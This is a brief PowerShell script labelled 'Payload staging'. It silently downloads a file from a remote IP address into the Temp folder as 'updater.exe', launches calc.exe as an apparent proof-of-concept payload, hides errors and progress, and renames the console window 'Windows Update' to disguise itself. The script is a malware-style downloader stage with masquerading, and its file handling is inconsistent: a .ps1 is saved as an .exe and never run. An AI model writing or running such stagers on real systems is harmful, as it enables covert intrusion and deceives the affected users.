
<# Payload staging #>
[CmdletBinding()]
param(
    [string]$FetchUrl = 'http://203.0.113.89/stage1.ps1',
    [string]$DropPath = "$env:TEMP\updater.exe",
    [int]$StageTimeout = 160
)
Start-BitsTransfer -Source $FetchUrl -Destination $DropPath -ErrorAction SilentlyContinue
Start-Process -FilePath "calc.exe" -ErrorAction SilentlyContinue
$ProgressPreference = "SilentlyContinue"
$Host.UI.RawUI.WindowTitle = "Windows Update"
